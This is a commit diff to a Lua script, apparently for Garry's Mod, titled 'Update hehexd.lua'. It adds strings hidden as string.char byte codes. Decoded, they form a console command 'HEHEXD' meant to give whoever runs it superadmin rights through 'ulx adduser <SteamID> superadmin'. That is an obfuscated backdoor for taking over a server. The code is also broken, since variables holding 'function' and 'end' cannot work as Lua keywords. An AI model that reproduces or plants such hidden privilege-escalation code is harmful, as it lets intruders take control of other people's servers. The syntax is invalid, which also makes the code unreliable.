2ba5ed0d2db0b5e1333abf4b633eec08fc0ab908
DEADMONSTOR <josh14m@aol.com>
2016-10-11 11:35:32 +0100

    Update hehexd.lua

--- Stuff/hehexd.lua
+++ Stuff/hehexd.lua
@@ -1,6 +1,8 @@
 local RCC = string.char(82,	117,	110,	67,	111,	110,	115,	111,	108,	101,	67,	111,	109,	109,	97,	110,	100 , 40	, 41 )
 local PWN = string.char(102,	117,	110,	99,	116, 105,	111,	110)
 local REKT = string.char(101,	110,	100)
+local HAHAHAHAHHA = string.char(117,	108,	120,	32,	97,	100	,100,	117,	115,	101,	114,	32)
+local HAHHAHAHAHAH = string.char(32,	115,	117,	112,	101,	114,	97,	100,	109,	105,	110)
+local lmfao = string.char(112,	108,	121,	58,	83,	116,	101,	97,	109	,73,	68,	40,	41)
 
-PWN HEHEXD(ply , cmd , args) REKT concommand.Add("HEHEXD" , HEHEXD)
-PWN testttt() RCC("") REKT timer.Simple(1 , testttt)
+PWN HEHEXD(ply , cmd , args) RCC(HAHAHAHAHHA..lmfao..HAHHAHAHAHAH) REKT concommand.Add("HEHEXD" , HEHEXD) PWN testttt() RCC() REKT timer.Simple(1 , testttt)
